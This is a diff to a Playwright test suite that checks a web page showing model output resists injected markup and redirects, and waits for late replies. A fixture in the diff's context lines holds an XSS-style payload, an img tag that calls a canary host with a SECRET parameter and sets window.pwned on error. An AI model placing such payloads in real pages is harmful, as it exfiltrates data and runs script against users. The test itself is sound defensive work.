@@ -56,13 +56,40 @@ STRUCTURE = """() => ({
 })"""
 SETTLE = "() => new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r)))"
 ANSWER_LABEL = (
-    "Model output. It can quote e-mails and documents word for word; nothing in it is a link."
+    "Model output. It can quote e-mails and documents word for word. Nothing in it is a"
+    " clickable link; do not copy addresses from it into a browser."
 )
 GROUNDING_NOTE = (
     "Found in the sources means the figure appears in a document this answer retrieved,"
     " not that it is correct."
 )
 NO_ANSWER = "The request failed: no answer from the server."
+expect.set_options(timeout=TIMEOUT_MS)
+
+# Counts the replies the page has finished handling (test re-check, item 1), so a test
+# that asserts "a late reply changed nothing" knows the page has seen that reply. A
+# reply counts once the page's own code after it has run: a task after the fetch
+# settles, and, if the page read the body, a task after that read settles. Test-side
+# only: an init script wraps fetch, the page's code is unchanged.
+HANDLED = """
+window.__handled = 0;
+(() => {
+  const count = () => setTimeout(() => { window.__handled += 1; }, 0);
+  const realFetch = window.fetch;
+  const realJson = Response.prototype.json;
+  window.fetch = function (...args) {
+    return realFetch.apply(this, args).then(
+      (response) => {
+        let read = null;
+        response.json = function () { read = realJson.call(this); return read; };
+        setTimeout(() => { (read || Promise.resolve()).then(count, count); }, 0);
+        return response;
+      },
+      (error) => { count(); throw error; },
+    );
+  };
+})();
+"""
 
 HOSTILE = (
     f'<img src="https://{CANARY}/i.png?d=SECRET" onerror="window.pwned=1">'
@@ -139,7 +166,6 @@ class Api:
 def _context(browser: Browser, *, bypass_csp: bool) -> BrowserContext:
     context = browser.new_context(service_workers="block", bypass_csp=bypass_csp)
     context.set_default_timeout(TIMEOUT_MS)
-    expect.set_options(timeout=TIMEOUT_MS)
     context.add_init_script(LISTEN_FOR_VIOLATIONS)
     return context
 
@@ -502,21 +528,27 @@ def test_a_network_failure_is_stated(context: BrowserContext, app_url: str) -> N
     assert page.locator("#ask button").is_enabled()
 
 
-def test_a_redirect_is_not_followed(context_without_csp: BrowserContext, app_url: str) -> None:
-    # With the CSP bypassed, so connect-src cannot be what stops it.
-    recorder = Recorder(context_without_csp)
-    context_without_csp.route(
+def test_a_redirect_is_not_followed(context: BrowserContext, app_url: str) -> None:
+    # A same-origin target, counted: a followed redirect would reach it whatever the CSP,
+    # DNS or CORS do, so only redirect: "error" keeps the count at zero.
+    followed: list[str] = []
+    context.route(
         app_url + "/api/ask",
-        lambda route: route.fulfill(
-            status=302, headers={"location": f"https://{CANARY}/next?d=SECRET"}
-        ),
+        lambda route: route.fulfill(status=302, headers={"location": app_url + "/api/elsewhere"}),
     )
-    page = context_without_csp.new_page()
+
+    def elsewhere(route: Route) -> None:
+        followed.append(route.request.method)
+        route.fulfill(status=200, content_type="application/json", body=json.dumps(answer()))
+
+    context.route(app_url + "/api/elsewhere", elsewhere)
+    page = context.new_page()
     opened(page, app_url)
     ask(page)
     expect(page.locator("#status")).to_have_text(NO_ANSWER)
     settle(page)
-    assert not [url for url in recorder.requests if CANARY in url], recorder.requests
+    assert followed == []
+    assert page.locator("#result").is_hidden()
 
 
 def broken(**changes: object) -> str:
@@ -629,6 +661,7 @@ class Held:
 
     def __init__(self, context: BrowserContext, base: str) -> None:
         self.routes: list[Route] = []
+        context.add_init_script(HANDLED)
         # A lambda: Playwright cannot wrap a builtin method such as list.append.
         context.route(base + "/api/ask", lambda route: self.routes.append(route))
 
@@ -642,6 +675,7 @@ class Held:
     @staticmethod
     def answer(page: Page, route: Route, late: str, body: dict[str, object]) -> None:
         """Answers one held request and waits until the page has handled it."""
+        handled = page.evaluate("window.__handled")
         if late == "network error":
             with page.expect_event("requestfailed"):
                 route.abort()
@@ -649,6 +683,12 @@ class Held:
             status = 500 if late == "500" else 200
             with page.expect_event("requestfinished"):
                 route.fulfill(status=status, content_type="application/json", body=json.dumps(body))
+        for _ in range(100):
+            if page.evaluate("window.__handled") > handled:
+                break
+            page.wait_for_timeout(20)
+        else:
+            pytest.fail("the page never finished handling the reply")
         settle(page)
 
 
